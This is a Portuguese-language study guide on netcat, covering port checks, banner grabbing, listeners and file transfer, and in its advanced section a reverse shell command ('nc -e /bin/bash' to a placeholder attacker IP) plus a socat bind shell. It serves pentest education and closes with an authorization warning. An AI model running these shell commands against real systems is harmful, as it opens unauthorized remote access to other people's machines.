# Netcat — do básico ao avançado

## O que é

Netcat (`nc`) é uma ferramenta de rede genérica para ler e escrever dados através de conexões TCP e UDP, frequentemente chamada de "canivete suíço das redes" por servir a um número enorme de propósitos diferentes com a mesma sintaxe básica: testar portas, transferir arquivos, criar conexões simples de chat, fazer banner grabbing e, em contextos de pentest, atuar como listener ou conector em técnicas de pós-exploração.

Criado originalmente por Hobbit em 1995, hoje existem variações como o **Ncat** (reescrita moderna mantida pelo projeto Nmap, com suporte a SSL e proxy) e o **Socat** (mais avançado, com suporte a mais tipos de socket). Este arquivo cobre o `nc` clássico, presente por padrão na maioria das distribuições Linux, incluindo o Kali.

## Instalação

```bash
sudo apt install netcat-traditional
```

Já vem pré-instalado na grande maioria das distribuições Linux, incluindo o Kali (como visto na lista de dependências do Legion). Vale notar que diferentes builds de `nc` existem (tradicional, OpenBSD, Ncat), com pequenas diferenças de flags disponíveis entre elas.

## Nível básico

### Sintaxe geral

```
nc [opções] host porta
```

### Testando conectividade com uma porta

```bash
nc -zv alvo 80
```

`-z` faz o netcat apenas testar se a conexão pode ser estabelecida, sem enviar dados (modo scan) — e `-v` (verbose) exibe o resultado na tela. É uma forma simples de confirmar se uma porta específica está aberta, sem precisar de uma ferramenta dedicada como o Nmap.

### Escaneando um intervalo de portas

```bash
nc -zv alvo 20-100
```

Testa sequencialmente todas as portas no intervalo informado — útil para verificações rápidas, embora o Nmap seja bem mais indicado quando o objetivo é uma varredura completa e detalhada (com detecção de serviço, versão, etc.).

### Banner grabbing

```bash
nc alvo 22
```

Conectar diretamente a uma porta de serviço costuma revelar o banner que ele retorna ao primeiro contato — muitos serviços (SSH, FTP, SMTP) se identificam automaticamente assim que a conexão é aberta, sem precisar enviar nenhum comando. É a mesma técnica já citada no `footprinting.md` e no `Scanning.md`.

## Nível intermediário

### Modo listener (servidor)

```bash
nc -lvnp 4444
```

`-l` coloca o netcat em modo de escuta (listener) em vez de tentar se conectar a algo. `-n` evita resolução de DNS (mais rápido), `-p` define a porta local em que ele vai escutar. Esse listener aceita uma conexão de entrada e passa a trocar dados diretamente com ela pelo terminal.

### Conectando dois terminais (chat simples)

```bash
# máquina A (listener)
nc -lvnp 4444

# máquina B (cliente)
nc IP_da_maquina_A 4444
```

Depois que a conexão é estabelecida, tudo que for digitado em um dos terminais aparece no outro — o exemplo mais simples de como o netcat funciona como um "cano" bidirecional entre duas máquinas.

### Transferência de arquivos

```bash
# máquina que recebe (listener)
nc -lvnp 4444 > arquivo_recebido.txt

# máquina que envia
nc IP_do_destino 4444 < arquivo_para_enviar.txt
```

Redirecionando entrada e saída padrão, o netcat também serve para transferir arquivos entre duas máquinas sem precisar de um servidor FTP/SCP configurado — bastante usado em cenários de pós-exploração para mover arquivos entre atacante e alvo quando não há outra ferramenta de transferência disponível.

### Timeout de conexão

```bash
nc -zv -w 2 alvo 1-1000
```

`-w` define um tempo limite (em segundos) para cada tentativa de conexão — importante em varreduras de porta para não travar esperando indefinidamente por hosts que não respondem.

## Nível avançado

### Reverse shell e bind shell (conceito)

Em pós-exploração, o netcat é frequentemente citado como ferramenta capaz de estabelecer uma shell remota entre duas máquinas, depois que algum outro meio (uma vulnerabilidade já explorada, como descrito no `exploitation.md`) já garantiu execução de comando no sistema-alvo. Existem dois modelos:

- **Bind shell**: o alvo abre um listener e espera o atacante se conectar a ele.
- **Reverse shell**: o alvo se conecta de volta ao atacante, que está com um listener aberto — modelo mais comum na prática, já que costuma atravessar firewalls e NAT com mais facilidade (a conexão sai do alvo, em vez de entrar).

A versão tradicional do netcat suporta a flag `-e`, que conecta a entrada/saída da conexão diretamente a um interpretador de comandos:

```bash
nc -e /bin/bash IP_do_atacante 4444
```

Por questões de segurança, muitas distribuições removem o suporte a `-e` do build padrão do `nc` justamente para dificultar esse uso — nesses casos, o mesmo efeito é obtido redirecionando manualmente entrada e saída por um FIFO (named pipe), ou usando ferramentas como **Ncat** ou **Socat**, que mantêm um parâmetro equivalente (`--exec` no Ncat).

Importante deixar claro: o netcat **não explora nenhuma vulnerabilidade por si só** — ele é apenas o canal de comunicação usado depois que outra falha (upload de arquivo, RCE, credencial fraca, etc.) já deu algum nível de execução de comando no alvo. É o mesmo papel de "canal" que o Laudanum cumpre com web shells, mas aqui a ferramenta em si é de uso geral, não construída exclusivamente para esse fim.

### Netcat como proxy simples

```bash
nc -lvnp 8080 > dados_capturados.txt
```

Combinado com redirecionamento, o netcat também pode atuar como um proxy rudimentar ou capturador de tráfego bruto — útil para depurar rapidamente o que um cliente está enviando a um serviço, sem precisar configurar uma ferramenta mais completa como o Burp Suite.

### Alternativas mais robustas: Ncat e Socat

```bash
ncat --ssl -lvnp 4444        # listener com criptografia SSL/TLS
socat TCP-LISTEN:4444,fork EXEC:/bin/bash   # equivalente funcional a uma bind shell
```

O Ncat (parte do projeto Nmap) adiciona suporte nativo a SSL/TLS e a proxies, resolvendo uma das maiores limitações do netcat clássico: tráfego em texto puro, fácil de identificar em uma captura de rede. O Socat vai além, suportando praticamente qualquer tipo de socket (Unix, SSL, UDP, etc.) com uma sintaxe mais verbosa, mas muito mais flexível.

## Fluxo típico de uso

| Ordem | Cenário | Comando de exemplo |
|---|---|---|
| 1 | Testar se uma porta está aberta | `nc -zv alvo porta` |
| 2 | Confirmar serviço via banner grabbing | `nc alvo porta` |
| 3 | Abrir listener para receber conexão | `nc -lvnp porta` |
| 4 | Transferir arquivo entre máquinas | `nc -lvnp porta > arquivo` / `nc IP porta < arquivo` |
| 5 | Estabelecer shell remota (pós-exploração, já com execução de comando) | `nc -e /bin/bash IP porta` |
| 6 | Alternativa criptografada | `ncat --ssl` |

## Considerações éticas e legais

O uso do netcat para escaneamento simples e banner grabbing segue a mesma lógica de qualquer ferramenta de reconhecimento ativo: só deve ser usado contra sistemas próprios ou com autorização explícita. Já o uso como shell remota pressupõe que algum acesso ou vulnerabilidade já foi explorado em outra etapa — nesse contexto, autorização e escopo bem definidos são ainda mais críticos, já que estabelecer esse tipo de canal em um sistema de terceiros sem consentimento configura acesso indevido a sistema de informação, independentemente da ferramenta usada para isso.

## Referências

- Manual do Netcat (`man nc`)
- Documentação oficial do Ncat — Nmap Project (nmap.org/ncat)
- Documentação oficial do Socat (dest-unreach.org/socat)